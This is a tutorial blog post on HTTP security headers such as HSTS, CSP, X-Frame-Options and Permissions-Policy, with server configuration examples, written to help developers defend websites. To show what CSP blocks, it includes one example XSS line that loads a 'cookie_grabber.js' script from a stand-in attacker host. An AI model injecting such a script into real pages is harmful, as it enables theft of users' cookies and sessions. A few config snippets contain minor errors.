---
layout: blog_post
title: "An Overview of Best Practices for Security Headers"
author: vickie-li
by: contractor
communities: [security]
description: "Security headers instruct browsers how to behave and prevent them from executing vulnerabilities that would endanger your users. Learn how to use them in this tutorial."
tags: [security, http, security-headers]
tweets:
- "Want to improve your website's Security Headers score? Read on. We've published an overview of best practices that can raise your grade from F to A!"
- "Security headers like CSP and HSTS can be quite handy for making your site more secure. Learn more in this tutorial! 👇"
- "Add security headers to your site to show your users you care about them. 🥰"
image: blog/security-headers-best-practices/security-headers-social.png
type: awareness
---

Many decisions go into the process of creating a secure website. One of these decisions is selecting which HTTP security headers to implement. Today, we'll dive into the most important HTTP security headers and the best practices that will strengthen your website's security.

**Table of Contents**{: .hide }
* Table of Contents
{:toc}

## The Security Headers

HTTP security headers are HTTP response headers designed to enhance the security of a site. They instruct browsers on how to behave and prevent them from executing vulnerabilities that would endanger your users.

### HTTP Strict Transport Security (HSTS)

First, the Strict-Transport-Security header forces the browser to communicate with HTTPS instead of HTTP. HTTPS is the encrypted version of the HTTP protocol. Strictly using HTTPS can prevent most man-in-the-middle and session hijacking attacks.

This header has two configuration options: `max-age` and `includeSubDomains`. `max-age` is the number of seconds the browser should remember this setting. And if `includeSubDomains` is selected, the settings will apply to any subdomains of the site as well.

```
Strict-Transport-Security: max-age=31536000 ; includeSubDomains
```

Ideally, this header should be set on all pages of the site to force browsers to use HTTPS.

### Content-Security-Policy (CSP) 

The Content-Security-Policy header controls which resource the browser is allowed to load for the page. For example, servers can restrict the scripts browsers use to a few trusted origins. This prevents some cross-site scripting attacks that load scripts from a malicious domain.

```html
<script src="attacker.com/cookie_grabber.js"></script>
```

There are many different directives of the policy, but the most important one is `script-src`, which defines where scripts can be loaded from. Other directives include `default-src`, `object-src`, `img-src`, and more. You can define a policy using the" header syntax:

```
Content-Security-Policy: RESOURCE-TYPE ORIGIN ORIGIN ORIGIN ...
```

For example, this policy limits the source of scripts to the current domain, and "www.okta.com". `self` represents the current domain.

```
Content-Security-Policy: script-src 'self' https://www.okta.com
```

The `default-src` directive defines the policy for any resource that does not already have a policy. For example, this policy tells the browsers that all scripts should come from subdomains of "okta.com", and all other resources should only load from the current domain.

```
Content-Security-Policy: default-src 'self'; script-src https://*.okta.com
```

### X-XSS-Protection

This header controls the XSS auditor on the user's browser. There are four options for this header.

```
X-XSS-Protection: 0 (Turns off XSS Auditor)
X-XSS-Protection: 1 (Turns on XSS Auditor)

X-XSS-Protection: 1; mode=block (Turns on XSS Auditor, prevents rendering the page when an attack is detected)

X-XSS-Protection: 1; report=REPORT_URI (Sanitizes the page and sends a report to the report URL when an attack is detected)
```

XSS auditors are built-in XSS filters implemented by some browsers. However, they are not a reliable way to protect your site against XSS attacks. Many browsers have removed their built-in XSS auditor because they can help attackers bypass XSS controls implemented by websites.

The current best practice is turning the XSS auditor off and implementing comprehensive XSS protection on the server side.

```
X-XSS-Protection: 0
```

### X-Frame-Options

The X-Frame-Options header prevents clickjacking attacks. Clickjacking is an attack in which attackers frame the victim site as a transparent layer on a malicious page to trick users into executing unwanted actions.

This header instructs the browser whether the page's contents can be rendered in an iframe. There are three options: `DENY`, `SAMEORIGIN`, and `ALLOW-FROM`.

```
X-Frame-Options: DENY (Page cannot be framed)

X-Frame-Options: SAMEORIGIN (Allow framing from pages of the same origin: same protocol, host, and port)

X-Frame-Options: ALLOW-FROM https://google.com (Allow framing from specified domain)
```

One of these options should be set on all pages that contain state-changing actions.

### Referrer-Policy

The Referrer-Policy header tells the browser when to send Referrer information. This can help prevent information leakages offsite via Referrer URLs. There are many options for this header, the most useful ones being `no-referrer`, `origin`, `origin-when-cross-origin`, and `same-origin`. Note that "referrer" is not misspelled in this header like it is [in HTTP's "Referer"](https://en.wikipedia.org/wiki/HTTP_referer)!

```
Referrer-Policy: no-referrer (Do not send referer)

Referrer-Policy: origin (Send the origin, no path or parameters)

Referrer-Policy: origin-when-cross-origin (Send the origin when the destination is offsite, otherwise, send entire referer)

Referrer-Policy: same-origin (Send referer when the destination is of the same origin, otherwise, send no referer)
```

You should consider using one of the above options as your Referrer-Policy header. They all protect against user info leaks in a referer path or parameter. In addition to setting the correct Referrer-Policy header, you should also avoid transporting sensitive information in URLs if possible.

### X-Content-Type-Options

This header prevents MIME-sniffing. MIME-sniffing is when browsers try to determine the document's file type by examining its content and disregarding the server's instructions set in the Content-Type header.

MIME-sniffing is a useful feature but can lead to vulnerabilities. For example, an attacker can upload a JavaScript file with the extension of an image file. When others try to view the image, their browsers detect that the file is a JavaScript file and execute it instead of rendering it as an image. Setting this header to `nosniff` will prevent MIME-sniffing.

```
X-Content-Type-Options: nosniff
```

Ideally, this header should be set for all content so that your website can decide how the browser renders files by setting the Content-Type response header. You could also use a separate subdomain to host user-uploaded content to prevent potential XSS attacks on the main domain.

### Permissions-Policy

The Permissions-Policy header lets you enable and disable browser features. For example, you can control whether the current page and any pages it embeds have access to the user's camera, microphone, and speaker. This allows developers to build sites that protect users' privacy and security. The Permissions-Policy header looks like this.

```
Permissions-Policy: FEATURE ORIGIN; FEATURE ORIGIN

Permissions-Policy: microphone=(), camera=()
There are three options for the allowed ORIGINs of each feature.
Permissions-Policy: microphone=(*) (Microphone will be allowed in this page and all framed pages)

Permissions-Policy: microphone=(self) (Microphone will be allowed in this page and all framed pages if same origin)

Permissions-Policy: microphone=() (Microphone will be disallowed in this page and all framed pages)
```

You can also specify the specific domain where the feature is allowed:

```
Permissions-Policy: microphone=(self "https://example.com")
```

You can configure these directories according to your needs. It's a good idea to place some control over the features that your iframes can access.

## Configuring a Security Header

After you've determined which headers to use, you can configure your server to send them with HTTP responses.

### Nginx

In Nginx, you can add a header by adding these lines to your site's configuration.

```
add_header X-Frame-Options SAMEORIGIN always;
add_header Content-Security-Policy "default-src 'self' https://*.okta.com";
add_header Permissions-Policy microphone=()
```

### Apache

In Apache, the syntax is similar.

```
Header always set X-Frame-Options "SAMEORIGIN"
Header set Content-Security-Policy "default-src 'self' https://*.okta.com";
Header always set "microphone 'none'; camera 'none'";
```

### IIS

Finally, you can configure headers in IIS by adding custom headers to your site's configuration file.

```xml
<configuration>
   <system.webServer>
      <httpProtocol>
         <customHeaders>
            <add name="X-Frame-Options" value="SAMEORIGIN" />
            <add name="X-XSS-Protection" value="0" />
         </customHeaders>
      </httpProtocol>
   </system.webServer>
</configuration>
```

### Firebase

Major cloud providers also give you options to customize the security headers you use. For instance, if you use Firebase, you can add security headers into the `firebase.json` file. Add a `headers` key to the JSON file with the security headers you want to add as its values:

```json
"headers": [
    { "key": "Permissions-Policy",
      "value": "microphone=(), camera=()"
    },
    {"key": "X-Frame-Options",
      "value": "DENY"
    }
]
```

For more information about how to configure security headers on different cloud providers, such as Heroku, Netlify, and AWS, read [Angular Deployment with a Side of Spring Boot](/blog/2020/05/29/angular-deployment).

### Learn More About Security Headers

In this post, we looked at some of the most important HTTP security headers. By using these headers on your site, you'll be able to prevent some basic attacks and improve your site's security! [securityheaders.com](https://securityheaders.com) is a good resource to help you implement the correct security headers. It can scan your website and point out which security headers you have implemented and which are still missing. You can even [try it on this site](https://securityheaders.com/?q=developer.okta.com%2Fblog&followRedirects=on). 

Got questions or feedback about HTTP security headers and how to improve the security score of your webpages? Drop a comment below, we're happy to hear from you. Want to stay up to date on the latest articles, videos, and events from the Okta DevRel team? Follow our social channels: [@oktadev on Twitter](https://twitter.com/oktadev), [Okta for Developers on LinkedIn](https://www.linkedin.com/company/oktadev), [Twitch](https://www.twitch.tv/oktadev), and [YouTube](https://youtube.com/oktadev).
